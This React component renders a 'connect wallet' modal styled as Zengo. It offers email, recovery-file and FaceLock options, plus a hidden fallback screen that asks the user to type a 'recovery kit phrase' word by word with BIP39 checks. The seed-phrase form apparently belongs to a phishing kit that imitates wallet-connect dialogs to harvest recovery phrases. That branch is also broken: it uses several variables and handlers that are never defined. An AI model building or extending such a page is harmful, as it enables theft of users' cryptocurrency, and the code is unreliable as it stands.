'use client';

import { useState } from 'react';
import { isValidBip39Word } from '@/lib/bip39-utils.js';
import { X, ArrowLeft } from 'lucide-react';



export default function ZengoWalletModal({ onClose, onConnect, onBack }) {
  const [selectedMethod, setSelectedMethod] = useState(null);
  const [email, setEmail] = useState('');
  const [recoveryFileName, setRecoveryFileName] = useState('');

  const handleEmailConnect = () => {
    if (email.trim()) {
      onConnect('Zengo', { method: 'email', email: email.trim() });
      onClose();
    }
  };

  const handleRecoveryFileConnect = () => {
    if (recoveryFileName.trim()) {
      onConnect('Zengo', { method: 'recoveryFile', fileName: recoveryFileName.trim() });
      onClose();
    }
  };

  const handleFaceLockConnect = () => {
    onConnect('Zengo', { method: '3dFaceLock' });
    onClose();
  };

  return (
    <div className="modal-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="modal-content" style={{ maxWidth: 520 }}>
        <div className="modal-header" style={{ position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          {selectedMethod ? (
            <button className="close-btn" onClick={() => setSelectedMethod(null)} aria-label="Back" style={{ position: 'absolute', left: 0, marginRight: 4 }}><ArrowLeft size={16} /></button>
          ) : onBack ? (
            <button className="close-btn" onClick={onBack} aria-label="Back" style={{ position: 'absolute', left: 0, marginRight: 4 }}><ArrowLeft size={16} /></button>
          ) : null}
          <h2 style={{ margin: 0, textAlign: 'center' }}>Zengo</h2>
          <button className="close-btn" onClick={onClose} aria-label="Close" style={{ position: 'absolute', right: 0 }}><X size={18} /></button>
        </div>

        <div className="modal-body">
          {!selectedMethod ? (
            <>
              <div style={{ textAlign: 'center', marginBottom: 24 }}>
                <img src="/icons/zengo-icn.svg" alt="Zengo" style={{ width: 60, height: 60, margin: '0 auto 16px', display: 'block' }} />
                <p style={{ margin: 0, fontSize: 14, color: 'var(--text-dim)', lineHeight: 1.5 }}>
                  Connect using one of Zengo's supported recovery options. Choose Email, Recovery File, or 3D FaceLock to continue.
                </p>
              </div>

              <div style={{ display: 'grid', gap: 12, marginBottom: 24 }}>
                {[
                  { label: 'Email', description: 'Verify with your registered Zengo email address.', method: 'email' },
                  { label: 'Recovery File', description: 'Use your stored Zengo recovery file.', method: 'recoveryFile' },
                  { label: '3D FaceLock', description: 'Authenticate with 3D FaceLock biometrics.', method: 'faceLock' },
                ].map((option) => (
                  <button
                    key={option.method}
                    type="button"
                    onClick={() => setSelectedMethod(option.method)}
                    style={{
                      width: '100%',
                      textAlign: 'left',
                      padding: 16,
                      borderRadius: 14,
                      border: '1px solid rgba(255,255,255,0.15)',
                      background: 'rgba(255,255,255,0.03)',
                      color: 'var(--text)',
                      cursor: 'pointer',
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.background = 'rgba(255,255,255,0.08)';
                      e.currentTarget.style.borderColor = 'var(--cyan)';
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.background = 'rgba(255,255,255,0.03)';
                      e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)';
                    }}
                  >
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <div>
                        <div style={{ fontSize: 15, fontWeight: 700, marginBottom: 4 }}>{option.label}</div>
                        <div style={{ fontSize: 13, color: 'var(--text-dim)' }}>{option.description}</div>
                      </div>
                      <span style={{ color: 'var(--cyan)', fontSize: 18 }}>→</span>
                    </div>
                  </button>
                ))}
              </div>

              <div style={{ backgroundColor: 'rgba(255,255,255,0.05)', borderRadius: 12, padding: 20 }}>
                <h3 style={{ margin: '0 0 16px 0', fontSize: 16, fontWeight: 600, color: 'var(--text)' }}>Get Zengo</h3>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
                  <a
                    href="https://zengo.com"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: 12,
                      border: '1px solid rgba(255,255,255,0.15)',
                      borderRadius: 8,
                      background: 'transparent',
                      color: 'var(--text)',
                      textDecoration: 'none',
                      cursor: 'pointer',
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.background = 'rgba(255,255,255,0.1)';
                      e.currentTarget.style.borderColor = 'var(--cyan)';
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.background = 'transparent';
                      e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)';
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <img src="/icons/website-4946.svg" alt="Website" style={{ width: 24, height: 24 }} />
                      <span style={{ fontSize: 14, fontWeight: 500 }}>Official Website</span>
                    </div>
                    <span style={{ color: 'var(--cyan)' }}>→</span>
                  </a>
                  <a
                    href="https://apps.apple.com/app/zengo-bitcoin-wallet/id1489375644"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: 12,
                      border: '1px solid rgba(255,255,255,0.15)',
                      borderRadius: 8,
                      background: 'transparent',
                      color: 'var(--text)',
                      textDecoration: 'none',
                      cursor: 'pointer',
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.background = 'rgba(255,255,255,0.1)';
                      e.currentTarget.style.borderColor = 'var(--cyan)';
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.background = 'transparent';
                      e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)';
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <img src="/icons/App_Store_(iOS).svg" alt="iOS" style={{ width: 24, height: 24 }} />
                      <span style={{ fontSize: 14, fontWeight: 500 }}>iOS App</span>
                    </div>
                    <span style={{ color: 'var(--cyan)' }}>→</span>
                  </a>
                  <a
                    href="https://play.google.com/store/apps/details?id=com.zengo"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: 12,
                      border: '1px solid rgba(255,255,255,0.15)',
                      borderRadius: 8,
                      background: 'transparent',
                      color: 'var(--text)',
                      textDecoration: 'none',
                      cursor: 'pointer',
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.background = 'rgba(255,255,255,0.1)';
                      e.currentTarget.style.borderColor = 'var(--cyan)';
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.background = 'transparent';
                      e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)';
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <img src="/icons/play-store-icon.svg" alt="Android" style={{ width: 24, height: 24 }} />
                      <span style={{ fontSize: 14, fontWeight: 500 }}>Android App</span>
                    </div>
                    <span style={{ color: 'var(--cyan)' }}>→</span>
                  </a>
                </div>
              </div>
            </>
          ) : selectedMethod === 'email' ? (
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 20, fontSize: 14 }}>
                Enter the email address associated with your Zengo account.
              </p>
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Email address"
                style={{
                  width: '100%',
                  padding: 12,
                  borderRadius: 12,
                  border: '1px solid rgba(255,255,255,0.15)',
                  background: 'rgba(255,255,255,0.04)',
                  color: 'var(--text)',
                  marginBottom: 20,
                  outline: 'none',
                }}
              />
              <button
                onClick={handleEmailConnect}
                disabled={!email.trim()}
                style={{
                  width: '100%',
                  padding: 12,
                  borderRadius: 8,
                  border: 'none',
                  background: email.trim() ? 'var(--cyan)' : 'rgba(255,255,255,0.1)',
                  color: email.trim() ? 'var(--bg)' : 'var(--text-dim)',
                  cursor: email.trim() ? 'pointer' : 'not-allowed',
                  fontWeight: 600,
                }}
              >
                Continue with Email
              </button>
            </>
          ) : selectedMethod === 'recoveryFile' ? (
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 20, fontSize: 14 }}>
                Upload your Zengo recovery file or confirm the file name below.
              </p>
              <input
                type="text"
                value={recoveryFileName}
                onChange={(e) => setRecoveryFileName(e.target.value)}
                placeholder="Recovery file name"
                style={{
                  width: '100%',
                  padding: 12,
                  borderRadius: 12,
                  border: '1px solid rgba(255,255,255,0.15)',
                  background: 'rgba(255,255,255,0.04)',
                  color: 'var(--text)',
                  marginBottom: 20,
                  outline: 'none',
                }}
              />
              <button
                onClick={handleRecoveryFileConnect}
                disabled={!recoveryFileName.trim()}
                style={{
                  width: '100%',
                  padding: 12,
                  borderRadius: 8,
                  border: 'none',
                  background: recoveryFileName.trim() ? 'var(--cyan)' : 'rgba(255,255,255,0.1)',
                  color: recoveryFileName.trim() ? 'var(--bg)' : 'var(--text-dim)',
                  cursor: recoveryFileName.trim() ? 'pointer' : 'not-allowed',
                  fontWeight: 600,
                }}
              >
                Continue with Recovery File
              </button>
            </>
          ) : selectedMethod === 'faceLock' ? (
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 20, fontSize: 14 }}>
                Use Zengo's 3D FaceLock to authenticate securely.
              </p>
              <button
                onClick={handleFaceLockConnect}
                style={{
                  width: '100%',
                  padding: 12,
                  borderRadius: 8,
                  border: 'none',
                  background: 'var(--cyan)',
                  color: 'var(--bg)',
                  cursor: 'pointer',
                  fontWeight: 600,
                }}
              >
                Continue with 3D FaceLock
              </button>
            </>
          ) : (
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 20, fontSize: 14 }}>
                Enter your Zengo recovery kit phrase to continue
              </p>

              <div style={{
                display: 'grid',
                gridTemplateColumns: 'repeat(2, 1fr)',
                gap: 12,
                marginBottom: 20,
                maxHeight: 380,
                overflowY: 'auto',
                paddingRight: 8,
              }}>
                {seedWords.map((word, index) => (
                  <div key={index} style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                    <span style={{ fontSize: 13, color: 'var(--text-dim)', minWidth: 20 }}>{index + 1}</span>
                    <input
                      type="text"
                      placeholder="Word"
                      value={word}
                      onChange={(e) => handleWordChange(index, e.target.value)}
                      style={{
                        flex: 1,
                        padding: '8px 10px',
                        border: `1px solid ${invalidWords.has(index) ? '#ff4444' : 'rgba(255,255,255,0.2)'}`,
                        borderRadius: 8,
                        background: 'transparent',
                        color: 'var(--text)',
                        fontSize: 12,
                        outline: 'none',
                      }}
                      onFocus={(e) => {
                        e.target.style.borderColor = invalidWords.has(index) ? '#ff4444' : 'var(--cyan)';
                      }}
                      onBlur={(e) => {
                        e.target.style.borderColor = invalidWords.has(index) ? '#ff4444' : 'rgba(255,255,255,0.2)';
                      }}
                    />
                  </div>
                ))}
              </div>

              <div style={{ textAlign: 'center', marginBottom: 20 }}>
                {missingCount > 0 ? (
                  <p style={{ color: 'var(--text-dim)', fontSize: 13, margin: 0 }}>Missing words: <span style={{ color: 'var(--cyan)' }}>{missingCount}</span></p>
                ) : invalidWords.size > 0 ? (
                  <p style={{ color: '#ff4444', fontSize: 13, margin: 0 }}>Invalid words: {invalidWords.size}</p>
                ) : (
                  <p style={{ color: 'var(--text-dim)', fontSize: 13, margin: 0 }}>All words valid</p>
                )}
              </div>

              <button
                onClick={handleConnect}
                disabled={!isComplete}
                style={{
                  width: '100%',
                  padding: 12,
                  border: 'none',
                  borderRadius: 8,
                  background: isComplete ? 'var(--cyan)' : 'rgba(255,255,255,0.1)',
                  color: isComplete ? 'var(--bg)' : 'var(--text-dim)',
                  fontSize: 14,
                  fontWeight: 600,
                  cursor: isComplete ? 'pointer' : 'not-allowed',
                }}
              >
                Connect Wallet
              </button>
            </>
          )}
        </div>
      </div>
    </div>
  );
}
